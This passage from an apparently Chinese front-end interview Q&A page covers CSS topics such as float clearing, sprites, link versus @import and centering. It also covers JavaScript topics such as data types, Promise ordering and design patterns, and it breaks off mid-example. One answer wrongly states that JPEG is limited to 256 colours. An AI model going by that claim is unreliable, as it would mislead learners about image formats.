class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>clear:both</code>:若是用在同一个容器内相邻元素上,那是贼好的,有时候在容器外就有些问题了, 比如相邻容器的包裹层元素塌陷</p><p><code>overflow:hidden</code>:这种若是用在同个容器内,可以形成 <code>BFC</code>避免浮动造成的元素塌陷</p><h3 id="4、css-sprite-是什么-有什么优缺点"><a href="#4、css-sprite-是什么-有什么优缺点" class="headerlink" title="4、css sprite 是什么,有什么优缺点"></a>4、css sprite 是什么,有什么优缺点</h3><p><code>参考答案</code>    </p><p>概念：将多个小图片拼接到一个图片中。通过 background-position 和元素尺寸调节需要显示的背景图案。</p><p>优点：</p><ol><li>减少 HTTP 请求数，极大地提高页面加载速度</li><li>增加图片信息重复度，提高压缩比，减少图片大小</li><li>更换风格方便，只需在一张或几张图片上修改颜色或样式即可实现</li></ol><p>缺点：</p><ol><li>图片合并麻烦</li><li>维护麻烦，修改一个图片可能需要重新布局整个图片，样式</li></ol><h3 id="5、link与-import的区别"><a href="#5、link与-import的区别" class="headerlink" title="5、link与@import的区别"></a>5、<code>link</code>与<code>@import</code>的区别</h3><p><code>参考答案</code>  </p><ol><li><code>link</code>是 HTML 方式， <code>@import</code>是 CSS 方式</li><li><code>link</code>最大限度支持并行下载，<code>@import</code>过多嵌套导致串行下载，出现<a href="http://www.bluerobot.com/web/css/fouc.asp/" target="_blank" rel="noopener">FOUC</a></li><li><code>link</code>可以通过<code>rel=&quot;alternate stylesheet&quot;</code>指定候选样式</li><li>浏览器对<code>link</code>支持早于<code>@import</code>，可以使用<code>@import</code>对老浏览器隐藏样式</li><li><code>@import</code>必须在样式规则之前，可以在 css 文件中引用其他文件</li><li>总体来说：<strong>link 优于@import</strong></li></ol><h3 id="6、display-block-和display-inline-的区别"><a href="#6、display-block-和display-inline-的区别" class="headerlink" title="6、display: block;和display: inline;的区别"></a>6、<code>display: block;</code>和<code>display: inline;</code>的区别</h3><p><code>参考答案</code>  </p><p><code>block</code>元素特点：</p><p>1.处于常规流中时，如果<code>width</code>没有设置，会自动填充满父容器 2.可以应用<code>margin/padding</code> 3.在没有设置高度的情况下会扩展高度以包含常规流中的子元素 4.处于常规流中时布局时在前后元素位置之间（独占一个水平空间） 5.忽略<code>vertical-align</code></p><p><code>inline</code>元素特点</p><p>1.水平方向上根据<code>direction</code>依次布局   </p><p>2.不会在元素前后进行换行   </p><p>3.受<code>white-space</code>控制   </p><p>4.<code>margin/padding</code>在竖直方向上无效，水平方向上有效   </p><p>5.<code>width/height</code>属性对非替换行内元素无效，宽度由元素内容决定   </p><p>6.非替换行内元素的行框高由<code>line-height</code>确定，替换行内元素的行框高由<code>height</code>,<code>margin</code>,<code>padding</code>,<code>border</code>决定<br>7.浮动或绝对定位时会转换为<code>block</code><br>8.<code>vertical-align</code>属性生效</p><h3 id="7、容器包含若干浮动元素时如何清理浮动"><a href="#7、容器包含若干浮动元素时如何清理浮动" class="headerlink" title="7、容器包含若干浮动元素时如何清理浮动"></a>7、容器包含若干浮动元素时如何清理浮动</h3><p><code>参考答案</code>  </p><ol><li>容器元素闭合标签前添加额外元素并设置<code>clear: both</code></li><li>父元素触发块级格式化上下文(见块级可视化上下文部分)</li><li>设置容器元素伪元素进行清理<a href="http://nicolasgallagher.com/micro-clearfix-hack/" target="_blank" rel="noopener">推荐的清理浮动方法</a></li></ol><pre class="line-numbers language-css"><code class="language-css"><span class="token comment" spellcheck="true">/*** 在标准浏览器下使用* 1 content内容为空格用于修复opera下文档中出现*   contenteditable属性时在清理浮动元素上下的空白* 2 使用display使用table而不是block：可以防止容器和*   子元素top-margin折叠,这样能使清理效果与BFC，IE6/7*   zoom: 1;一致**/</span><span class="token selector"><span class="token class">.clearfix</span><span class="token pseudo-element">:before</span>,<span class="token class">.clearfix</span><span class="token pseudo-element">:after</span> </span><span class="token punctuation">{</span>    <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">" "</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 1 */</span>    <span class="token property">display</span><span class="token punctuation">:</span> table<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 2 */</span><span class="token punctuation">}</span><span class="token selector"><span class="token class">.clearfix</span><span class="token pseudo-element">:after</span> </span><span class="token punctuation">{</span>    <span class="token property">clear</span><span class="token punctuation">:</span> both<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*** IE 6/7下使用* 通过触发hasLayout实现包含浮动**/</span><span class="token selector"><span class="token class">.clearfix</span> </span><span class="token punctuation">{</span>    *<span class="token property">zoom</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8、PNG-GIF-JPG-的区别及如何选"><a href="#8、PNG-GIF-JPG-的区别及如何选" class="headerlink" title="8、PNG,GIF,JPG 的区别及如何选"></a>8、PNG,GIF,JPG 的区别及如何选</h3><p><code>参考答案</code>  </p><p><strong>GIF</strong>:</p><ol><li>8 位像素，256 色</li><li>无损压缩</li><li>支持简单动画</li><li>支持 boolean 透明</li><li>适合简单动画</li></ol><p><strong>JPEG</strong>：</p><ol><li>颜色限于 256</li><li>有损压缩</li><li>可控制压缩质量</li><li>不支持透明</li><li>适合照片</li></ol><p><strong>PNG</strong>：</p><ol><li>有 PNG8 和 truecolor PNG</li><li>PNG8 类似 GIF 颜色上限为 256，文件小，支持 alpha 透明度，无动画</li><li>适合图标、背景、按钮</li></ol><h3 id="9、display-float-position-的关系"><a href="#9、display-float-position-的关系" class="headerlink" title="9、display,float,position 的关系"></a>9、display,float,position 的关系</h3><p><code>参考答案</code>  </p><ol><li>如果<code>display</code>为 none，那么 position 和 float 都不起作用，这种情况下元素不产生框</li><li>否则，如果 position 值为 absolute 或者 fixed，框就是绝对定位的，float 的计算值为 none，display 根据下面的表格进行调整。</li><li>否则，如果 float 不是 none，框是浮动的，display 根据下表进行调整</li><li>否则，如果元素是根元素，display 根据下表进行调整</li><li>其他情况下 display 的值为指定值 总结起来：<strong>绝对定位、浮动、根元素都需要调整display</strong></li></ol><h3 id="10、如何水平居中一个元素"><a href="#10、如何水平居中一个元素" class="headerlink" title="10、如何水平居中一个元素"></a>10、如何水平居中一个元素</h3><p><code>参考答案</code>  </p><ul><li><p>如果需要居中的元素为<strong>常规流中 inline 元素</strong>，为父元素设置<code>text-align: center;</code>即可实现</p></li><li><p>如果需要居中的元素为<strong>常规流中 block 元素</strong>，1）为元素设置宽度，2）设置左右 margin 为 auto。3）IE6 下需在父元素上设置<code>text-align: center;</code>,再给子元素恢复需要的值</p></li><li><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    aaaaaa aaaaaa a a a a a a a a    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector">body </span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#DDD</span><span class="token punctuation">;</span>        <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/* 3 */</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">500</span>px<span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">/* 1 */</span>        <span class="token property">text-align</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* 3 */</span>        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/* 2 */</span>        <span class="token property">background</span><span class="token punctuation">:</span> purple<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>如果需要居中的元素为<strong>浮动元素</strong>，1）为元素设置宽度，2）<code>position: relative;</code>，3）浮动方向偏移量（left 或者 right）设置为 50%，4）浮动方向上的 margin 设置为元素宽度一半乘以-1</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    aaaaaa aaaaaa a a a a a a a a    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector">body </span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#DDD</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">500</span>px<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* 1 */</span>        <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/* 2 */</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/* 3 */</span>        <span class="token property">margin-left</span><span class="token punctuation">:</span> -<span class="token number">250</span>px<span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/* 4 */</span>        <span class="token property">background-color</span><span class="token punctuation">:</span> purple<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><p>如果需要居中的元素为<strong>绝对定位元素</strong>，1）为元素设置宽度，2）偏移量设置为 50%，3）偏移方向外边距设置为元素宽度一半乘以-1</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    aaaaaa aaaaaa a a a a a a a a    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector">body </span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#DDD</span><span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">800</span>px<span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">50%</span><span class="token punctuation">;</span>        <span class="token property">margin-left</span><span class="token punctuation">:</span> -<span class="token number">400</span>px<span class="token punctuation">;</span>        <span class="token property">background-color</span><span class="token punctuation">:</span> purple<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><ul><li><p>如果需要居中的元素为<strong>绝对定位元素</strong>，1）为元素设置宽度，2）设置左右偏移量都为 0,3）设置左右外边距都为 auto</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    aaaaaa aaaaaa a a a a a a a a    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">    <span class="token selector">body </span><span class="token punctuation">{</span>        <span class="token property">background</span><span class="token punctuation">:</span> <span class="token hexcode">#DDD</span><span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token selector"><span class="token class">.content</span> </span><span class="token punctuation">{</span>        <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">800</span>px<span class="token punctuation">;</span>        <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>        <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span> auto<span class="token punctuation">;</span>        <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">right</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token property">background-color</span><span class="token punctuation">:</span> purple<span class="token punctuation">;</span>    <span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><h3 id="1、JS有几种数据类型-其中基本数据类型有哪些"><a href="#1、JS有几种数据类型-其中基本数据类型有哪些" class="headerlink" title="1、JS有几种数据类型,其中基本数据类型有哪些?"></a>1、JS有几种数据类型,其中基本数据类型有哪些?</h3><p><code>参考答案</code></p><p><strong>七种数据类型</strong></p><ul><li>Boolean</li><li>Null</li><li>Undefined</li><li>Number</li><li>String</li><li>Symbol (ECMAScript 6 新定义)</li><li>Object</li></ul><p>(ES6之前)其中5种为基本类型:<code>string</code>,<code>number</code>,<code>boolean</code>,<code>null</code>,<code>undefined</code>,</p><p>ES6出来的<code>Symbol</code>也是原始数据类型 ，表示独一无二的值</p><p><code>Object</code>为引用类型(范围挺大),也包括数组、函数,</p><h3 id="2、Promise-构造函数是同步执行还是异步执行，那么-then-方法呢？"><a href="#2、Promise-构造函数是同步执行还是异步执行，那么-then-方法呢？" class="headerlink" title="2、Promise 构造函数是同步执行还是异步执行，那么 then 方法呢？"></a>2、Promise 构造函数是同步执行还是异步执行，那么 then 方法呢？</h3><p><code>参考答案</code></p><pre><code>const promise = new Promise((resolve, reject) =&gt; {  console.log(1)  resolve()  console.log(2)})promise.then(() =&gt; {  console.log(3)})console.log(4)</code></pre><p>输出结果是：</p><pre><code>1243promise构造函数是同步执行的，then方法是异步执行的Promise new的时候会立即执行里面的代码 then是微任务 会在本次任务执行完的时候执行 setTimeout是宏任务 会在下次任务执行的时候执行</code></pre><h3 id="3、JS的四种设计模式"><a href="#3、JS的四种设计模式" class="headerlink" title="3、JS的四种设计模式"></a>3、JS的四种设计模式</h3><p><code>参考答案</code></p><p><strong>工厂模式</strong></p><p>简单的工厂模式可以理解为解决多个相似的问题;</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">CreatePerson</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>age<span class="token punctuation">,</span>sex<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> obj <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    obj<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    obj<span class="token punctuation">.</span>age <span class="token operator">=</span> age<span class="token punctuation">;</span>    obj<span class="token punctuation">.</span>sex <span class="token operator">=</span> sex<span class="token punctuation">;</span>    obj<span class="token punctuation">.</span>sayName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> obj<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> p1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CreatePerson</span><span class="token punctuation">(</span><span class="token string">"longen"</span><span class="token punctuation">,</span><span class="token string">'28'</span><span class="token punctuation">,</span><span class="token string">'男'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> p2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CreatePerson</span><span class="token punctuation">(</span><span class="token string">"tugenhua"</span><span class="token punctuation">,</span><span class="token string">'27'</span><span class="token punctuation">,</span><span class="token string">'女'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// longen</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 28</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 男</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p1<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// longen</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// tugenhua</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 27</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span>sex<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">// 女</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>p2<span class="token punctuation">.</span><span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// tugenhua  </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>单例模式</strong></p><p>只能被实例化(构造函数给实例添加属性与方法)一次</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 单体模式</span><span class="token keyword">var</span> Singleton <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>Singleton<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>getName <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>name<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 获取实例对象</span><span class="token keyword">var</span> getInstance <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> instance <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>instance<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//相当于一个一次性阀门,只能实例化一次</span>            instance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> instance<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 测试单体模式的实例,所以a===b</span><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> b <span class="token operator">=</span> <span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"bb"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <strong>沙箱模式</strong></p><p>将一些函数放到自执行函数里面,但要用闭包暴露接口,用变量接收暴露的接口,再调用里面的值,否则无法使用里面的值</p><pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">let</span> sandboxModel<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">sayName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">sayAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">{</span>        sayName<span class="token punctuation">:</span>sayName<span class="token punctuation">,</span>        sayAge<span class="token punctuation">:</span>sayAge    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>发布者订阅模式</strong></p><p>就例如如我们关注了某一个公众号,然后他对应的有新的消息就会给你推送,</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//发布者与订阅模式</span>    <span class="token keyword">var</span> shoeObj <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 定义发布者</span>    shoeObj<span class="token punctuation">.</span>list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 缓存列表 存放订阅者回调函数</span>    <span class="token comment" spellcheck="true">// 增加订阅者</span>    shoeObj<span class="token punctuation">.</span>listen <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span> <span class="token punctuation">{</span>        shoeObj<span class="token punctuation">.</span>list<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 订阅消息添加到缓存列表</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 发布消息</span>    shoeObj<span class="token punctuation">.</span>trigger <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> fn<span class="token punctuation">;</span> fn <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>list<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                fn<span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> arguments<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//第一个参数只是改变fn的this,</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>     <span class="token comment" spellcheck="true">// 小红订阅如下消息</span>    shoeObj<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>color<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"颜色是："</span> <span class="token operator">+</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"尺码是："</span> <span class="token operator">+</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 小花订阅如下消息</span>    shoeObj<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>color<span class="token punctuation">,</span> size<span class="token punctuation">)</span> <span class="token punctuation">{</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"再次打印颜色是："</span> <span class="token operator">+</span> color<span class="token punctuation">)</span><span class="token punctuation">;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"再次打印尺码是："</span> <span class="token operator">+</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    shoeObj<span class="token punctuation">.</span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">"红色"</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    shoeObj<span class="token punctuation">.</span><span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">"黑色"</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>代码实现逻辑是用数组存贮订阅者, 发布者回调函数里面通知的方式是遍历订阅者数组,并将发布者内容传入订阅者数组</p><h3 id="4、列举出集中创建实例的方法"><a href="#4、列举出集中创建实例的方法" class="headerlink" title="4、列举出集中创建实例的方法"></a>4、列举出集中创建实例的方法</h3><p><code>参考答案</code></p><p>1.字面量</p><pre><code>let 